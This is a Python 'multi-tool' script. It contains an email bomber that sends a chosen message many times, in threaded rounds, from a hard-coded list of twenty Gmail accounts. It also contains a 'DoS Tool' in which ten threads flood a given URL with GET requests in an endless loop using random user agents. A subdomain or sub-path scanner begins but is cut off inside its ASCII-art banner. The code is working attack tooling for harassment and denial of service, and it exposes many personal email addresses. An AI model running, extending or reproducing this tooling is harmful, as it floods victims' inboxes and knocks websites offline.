import os
import threading
import zipfile
import shutil
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from user_agent import generate_user_agent
from rich import traceback
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.progress import Progress
import time
from rich.markdown import Markdown
import re
import itertools
from rich.theme import Theme
import smtplib
from email.message import EmailMessage
import string
import glob
from functools import lru_cache
import requests
	
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def ask_again():
    return c.input("[info]Do You Want To Try Again?[ Y - N ]: ").strip().lower() == "y"
main_md = Markdown("# Multi-Tool..")
emails_md = Markdown("# Spamming Tool..")
c_t = Theme(
		{"info": "bold cyan", "regular": "bold green", "error": "bold red"})
traceback.install()
c = Console(theme=c_t)
layout = Layout()

#_________________Emails Spammer_________

def worker(email, password, rec, sub, text, n_rounds, per_msg_delay, barrier):
    try:
        conn = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
        conn.ehlo()
        conn.starttls()
        conn.login(email, password)
    except Exception as e:
        c.print(f"[error][{email}] Login failed: {e}")
        return

    try:
        for i in range(n_rounds):
            try:
                msg = EmailMessage()
                msg["From"] = email
                msg["To"] = ", ".join(rec)
                msg["Subject"] = sub
                msg.set_content(text)

                conn.send_message(msg)
                c.print(f"[regular][{email}] Sent round {i+1}/{n_rounds}")
            except Exception as send_e:
                c.print(f"[error][{email}] Send error in round {i+1}: {send_e}")

            time.sleep(per_msg_delay)

            try:
                barrier.wait()
            except threading.BrokenBarrierError:
                c.print(f"[info][{email}] Barrier broken, stopping worker.")
                break

    finally:
        try:
            conn.quit()
        except:
            pass
        c.print(f"[info][{email}] Connection closed.")

def main_emails():
    accounts = [
        ("mazen97988@gmail.com", os.getenv("KEY1")),
        ("mazen979887@gmail.com", os.getenv("KEY2")),
        ("khalid66861@gmail.com", os.getenv("KEY3")),
        ("ibrahim979101@gmail.com", os.getenv("KEY4")),
        ("kbrhom32@gmail.com", os.getenv("KEY5")),
        ("formazen123.1@gmail.com", os.getenv("KEY6")),
        ("formazen123.2@gmail.com", os.getenv("KEY7")),
        ("mkhalil97978@gmail.com", os.getenv("KEY8")),
        ("mkhalil0791@gmail.com", os.getenv("KEY9")),
        ("fahmed97811@gmail.com", os.getenv("KEY10")),
        ("maahmed110as@gmail.com", os.getenv("KEY11")),
        ("mmhmd96811@gmail.com", os.getenv("KEY12")),
        ("euro43488@gmail.com", os.getenv("KEY13")),
        ("euro63828@gmail.com", os.getenv("KEY14")),
        ("auaha5539@gmail.com", os.getenv("KEY15")),
        ("daniahmed1000@gmail.com", os.getenv("KEY16")),
        ("farah0696961@gmail.com", os.getenv("KEY17")),
        ("hornymazen109@gmail.com", os.getenv("KEY18")),
        ("alsese725@gmail.com", os.getenv("KEY19")),
        ("sexyboymazen109@gmail.com", os.getenv("KEY20"))
    ]
    c.print(emails_md, style="regular")

    rr = c.input("[regular]Enter The Emails:    ")
    sub = c.input("[regular]Enter The Subject:    ")
    c.print("[regular]Enter The Message Or \"END\" In Newline To Finish:    ")
    lines = []
    while True:
        line = c.input()
        if line == "END":
            break
        lines.append(line)
    text = "\n".join(lines)
    rec = [email.strip() for email in rr.split(",")]

    n = int(c.input("[regular]Enter The Times:    "))

    per_msg_delay = 0.5
    between_rounds_delay = 10

    active_accounts = accounts[:]

    num_workers = len(active_accounts)
    if num_workers == 0:
        c.print("[info]No accounts to use.")
        return

    barrier = threading.Barrier(num_workers + 1)

    threads = []
    for email, password in active_accounts:
        clear_screen()
        t1 = threading.Thread(target=worker, args=(email, password, rec, sub, text, n, per_msg_delay, barrier), daemon=True)
        threads.append(t1)
        t1.start()
        time.sleep(0.05)

    for i in range(n):
        try:
            clear_screen()
            barrier.wait()
        except threading.BrokenBarrierError:
            c.print("[error]Barrier broken in main; stopping rounds early.")
            break

        c.print(f"[info]Round {i+1}/{n} finished. Waiting {between_rounds_delay} seconds before next round...")
        time.sleep(between_rounds_delay)

    for th in threads:
        th.join(timeout=2)

    clear_screen()
    c.print("[info]All rounds complete.")

def emails_runner():
    while True:
        main_emails()
        clear_screen()
        l = c.input("[info]Enter 'C' To Try Again Or 'Q' To Quit: ")
        clear_screen()
        if l.lower() == 'c':
            continue
        elif l.lower() == 'q':
            c.print(Panel("[regular]Done!"))
            break
dos_md = Markdown("# DoS Tool..\n")

#________________________________________



#_________________DoS Tool______________
def main_dos():
		global url
		c.print(dos_md, style="green")
		logo = """	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿
	  	⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿
	  	⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿
	  	⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿
	  	⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻
	  	⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸
	  	⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	  	⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	  	⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	  	⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	  	⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
	  	⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⣾⣿⣿⣿⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣼
	  	⣿⣦⡀⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿
	  	⣿⣿⣿⣦⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⢀⣿⣿
	  	⣿⣿⡿⠛⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠁⠈⠻⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣸⣿⣿
	  	⣿⣿⠁⣼⣿⣿⣿⡿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⢹⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿
	  	⣿⢃⣀⠙⢿⣿⣿⠇⠃⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿
	  	⣿⠟⠉⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⡞⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⢀⣿⣿⠇⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿
	  	⣏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠠⠁⠀⠉⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿
	  	⣿⡄⠀⠀⠀⠀⠀⣠⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠃⠀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⡄⠀⠀⠀⢰⡇⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣦⣀⠀⢻⠀⣼⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⡀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣇⠀⠀⠹⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷⡄⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠁⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢠⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠠⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⣶⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣧⠀⠀⠀⣷⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⡀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⣿⣿⡿⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣇⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⢸⣿⣧⣀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢻⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣸⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
	  	⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣸⣧⠀⠀⢀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n"""
		c.print(f"[bold green]{logo}")
		url = c.input("[bold green]\nEnter The URL:\t")
		return url
def reqo():
    while True:
        try:
            headers = { "User-Agent": generate_user_agent() }
            r = requests.get(url, headers=headers, timeout=5)

            if r.status_code > 305:
                c.print(f"[!] BAD Response: {r.status_code}", style="bold red")
            else:
                c.print(f"[OK] {r.status_code}", style="bold green")

        except Exception as e:
            c.print(f"[Error] {e}", style="bold red")
    c.print("Successfully Started", style="bold cyan")

def dos_runner():
	while True:
		url = main_dos()
		threads = []
		for _ in range(10):
			t = threading.Thread(target=reqo, daemon=True)
			t.start()
			threads.append(t)

		time.sleep(0.2)
		
#________________________________________



#_______________sub-domains____________

MAX_WORKERS = 25
TIMEOUT = 5
DELAY_BETWEEN_REQUESTS = 0
def sub_art():
	sub_md = Markdown("# Scorpion Sub-Paths Catcher")
	sub_art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⣶⣶⣶⣶⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠿⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡈⠻⢿⣿⠿⣿⣿⣿⠇⣴⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣶⡆⠀⠀⠀⠀⠉⠀⢿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠙⢛⣉⣍⡛⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣄⣉⠛⣛⡉⠁⠀⠀⣀⣤⣶⣦⣤⣀⣶⠄⣿⣿⣿⣿⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠇⠀⠀⣸⠛⠉⠉⠙⣿⣿⣿⡆⢿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⠟⠀⠀⠀⠁⠀⠀⠀⠀⢸⣿⣿⣿⣮⡻⢿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⢋⣩⣭⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⣠⣶⡾⣿⣟⠛⣋⠁⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣩⣤⣶⣤⣄⡀⠀⢀⣼⣿⠟⠁⣩⣿⣿⢿⣿⡿⣽⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⢧⣾⣿⣿⣿⣿⣿⣿⡄⠻⠿⠁⢠⣾⣿⠟⣡⣾⣿⠛⢮⡛⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⢳⣾⣶⡄⠀⠈⢿⢸⣿⣿⣿⡟⣩⣶⣿⣿⣿⣷⣄⢿⡿⢫⣾⣿⣿⠏⣠⣼⡿⠾⣻⣽⣤⣶⡶⣦⣄⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠃⠈⠛⢿⣦⣀⣈⠈⢿⣿⡏⣼⣿⣿⣿⣿⣿⠿⣛⣂⣀⡛⢿⠟⣡⣾⣿⡿⢁⣾⣿⣿⣿⣿⡷⢹⣿⣿⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⣼⡿⠋⠉⠀⠀⠀⠀⠀⠹⢿⣼⢧⡈⠻⠀⣿⣿⣿⣿⢋⣴⣿⣿⣿⣿⣿⣷⣄⢿⡟⠋⠀⣾⣿⣿⡿⠉⠩⠷⠿⣿⣿⣿⣿⡿⣫⣶⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⠋⠀⢠⣶⣶⣶⣾⣿⣿⣿⣿⣷⡄⣶⣶⣆⣿⣿⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⠁⣀⣤⣶⣜⢿⠁⢸⣷⡄⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⣄⠀⠀
⠀⠀⠀⠀⣿⡇⠀⢰⣯⣿⠉⠉⢩⣍⣉⣉⣭⣭⣥⣭⣍⣻⣥⣭⣭⣜⠿⣿⣿⣿⣿⣿⣿⣿⠿⢓⠸⢿⣿⣿⡟⠀⠀⠀⢻⣧⣀⡀⠀⠈⠐⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⢀⣼⠿⠁⠀⢸⣿⡇⠀⢸⣿⠿⠟⠿⠿⠿⠿⢿⣿⣟⠛⠛⣻⣥⣴⣶⣄⠉⠛⠿⠟⢱⣿⣿⣿⡄⣀⠈⠀⠀⠀⠀⠈⠉⠛⠁⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⡇
⣠⡴⠟⠛⠁⠀⠀⢸⣿⡇⠀⣿⣿⠀⠀⢠⣼⣻⣿⣿⣿⣿⣿⣿⠾⣿⠿⠛⠁⣀⣴⣿⣷⠈⣛⠻⠟⠁⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⢿⣿⡇⢀⣾⣿⡃⠉⠙⠛⠋⠁⠀⠀⠀⠀⠀⣟⡛⠻⣿⡁⠀⣿⣇⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⠟⠿⠁⠀⢤⣤⣶⠆
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⢸⣿⡇⠸⣿⣿⡇⠀⠀⠀⣤⠾⠻⣿⣿⣶⣿⣿⣿⣦⠻⠃⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠇⠀⠀⠀⢠⣼⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠃⢸⣶⠁⢐⡿⠏⠀⠀⠀⢠⣶⣿⣷⠘⠿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠋⠀⠀⠀⠀⣀⣼⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠜⠉⠀⠀⠀⢻⣧⠘⣿⣦⠀⠀⢠⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⢀⣿⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡏⠀⠘⣿⣧⠀⣾⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠟⠀⠀⠀⣼⣿⠆⣿⣿⣿⣿⣿⢿⣿⣥⣴⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠀⢹⣿⣿⡟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣠⣤⣤⣤⣤⣶⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
